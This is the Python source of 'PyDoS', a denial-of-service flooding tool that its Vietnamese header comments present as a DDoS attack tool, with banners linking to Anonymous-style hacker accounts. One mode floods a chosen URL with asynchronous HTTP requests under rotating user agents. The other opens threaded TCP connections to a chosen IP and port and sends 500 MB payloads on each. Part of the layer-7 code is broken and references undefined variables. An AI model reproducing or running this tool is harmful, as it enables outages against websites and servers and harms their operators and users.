# PyDoS là một công cụ tấn công DDoS
# hỗ trợ đầy đủ chức năng ở cả layer4 và layer7
# Với khả năng phân tán tải
# PyDoS có thể tạo ra lượng lớn lưu lượng truy cập giả định từ nhiều nguồn đến mục tiêu bằng cách sử dụng các giao thức TCP, UDP và HTTP.
# WARNING , DONT ATTACKING GOVERMENT
# Twitter : @ Anonym0us_VNPC
# Telegram : @anonopsvn
# CHannel Telegram : t.me/AnonOpsNews
# Website : anonsbreaking.blogspot.com
# Website 2 : cyberkex-security.blogspot.com

import socket
import requests
import threading
import time
import random
import asyncio
import aiohttp
import sys
import os
import colorama
from colorama import Fore
from colorama import Style

colorama.init()

def banner_main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Fore.GREEN + '''
██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔════╝
██████╔╝ ╚████╔╝ ██║  ██║██║   ██║███████╗
██╔═══╝   ╚██╔╝  ██║  ██║██║   ██║╚════██║
██║        ██║   ██████╔╝╚██████╔╝███████║
╚═╝        ╚═╝   ╚═════╝  ╚═════╝ ╚══════╝
                     COPYRIGHT : PHAMCHIEN

===========================================
# Twitter : @ Anonym0us_VNPC
# Telegram : @anonopsvn
# CHannel Telegram : t.me/AnonOpsNews
# Website : anonsbreaking.blogspot.com
# Website 2 : cyberkex-security.blogspot.com
===========================================

       [1] Layer 7 ( DoS HTTP FLOOD )
       [2] Layer 4 ( DoS TCP AttACK )''')
	print("")

def banner_layer7():
	os.system('cls' if os.name == 'nt' else ' clear')
	print(Fore.GREEN + '''
██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ 
███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║  
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  
                           COPYRIGHT : PAHMCHIEN

================================================
# Twitter : @ Anonym0us_VNPC
# Telegram : @anonopsvn
# CHannel Telegram : t.me/AnonOpsNews
# Website : anonsbreaking.blogspot.com
# Website 2 : cyberkex-security.blogspot.com 
================================================''')
	print("")

def banner_layer4():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Fore.GREEN + '''
██╗      █████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║     ██║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝
                           COPYRIGHT : PHAMCHIEN

================================================
# Twitter : @ Anonym0us_VNPC
# Telegram : @anonopsvn
# CHannel Telegram : t.me/AnonOpsNews
# Website : anonsbreaking.blogspot.com
# Website 2 : cyberkex-security.blogspot.com
================================================''')
	print("")

# user agent

user_agent = [
    	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0",
    	"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
       "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0",
    	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
    	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4",
    	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)",
    	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
    	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4",
    	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
   	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)",
    	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
    	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MSBrowserIE; rv:11.0) like Gecko",
    	"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910V 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0",
    	"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0",
    	"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H143 Safari/600.1.4",
    	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
    	"Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
    	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",

]

banner_main()
choose = input("Choose : ")

if choose == "1":

	banner_layer7()
	target = input("target : ")

	async def send_packet_l7(user_agent, send_packet_l7):

		async with aiohttp.ClientSession() as session:
			# start request User Agent

			for user_agents in user_agent:
				user_agents = random.choice(user_agent)
				headers = {"User-Agent": user_agents}

				async with session.get(target, headers=headers) as request:

					if request.status == 200:
						print(Fore.GREEN + "[+] Packet Done")
					else:
						print(Fore.RED + "[!] Target Seized")

					await request.text()
					time.sleep(0.00)

	async def main():
		num_packet_layer7 = int(input("Num Packet : "))

		threads_layer7 = []
		threads_usr_agent = []

		for i in range(num_packet_layer7):
			task = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
			socket = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
			threads_layer7.append(task)
			threads_usr_agent.append(socket)

		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
	

	if __name__ == '__main__':
		loop = asyncio.get_event_loop()
		loop.run_until_complete(main())

		def socket_random():
			num = socket_random + 1
			response = requests.get(host, headers=headers)
			print("Packet Done")

		if __name__ == '__main__':

			packet = 5000

			threads = []

			for i in range(packet):
				thread_packet = threading.Thread(target=socket_random, args=(host,))
				threads.append(thread_packet)

			for thread_packet in threads:
				threads.start()

			for thread_packet in threads:
				threads.join()

	print(Fore.BLUE + "KILLED")

# Attacking Layer 4 

elif choose == "2":

	banner_layer4()
	ip = input("IP : ")
	port = int(input("Port : "))
	data_packet = int(input("Num DATA : "))
	num_packet_layer4 = int(input("Num Packet : "))

	data = b"a" * (1024 * 1024 * 500) # Created 500 MB

	def attacking(num_packet_layer4):
		for i in range(num_packet_layer4):
			num = i + 1
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			# Send Packet DATA to IP:PORT
			s.sendall(data)
			s.sendall(data)
			# check packet
			print(Fore.GREEN + "[{}] Packet DOne".format(num))
			time.sleep(0.00)
			# end socket 
			s.close()

	# threading
	threads_layer4 = []
	for i in range(num_packet_layer4):
		t = threading.Thread(target=attacking, args=(i,))
		threads_layer4.append(t)

	for t in threads_layer4:
		t.start()

	for t in threads_layer4:
		t.join()


else:
	def check():
		print("")
		print("[ {} ] Not Found ".format(choose))
		print("")
		# back main
		os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')

	check()
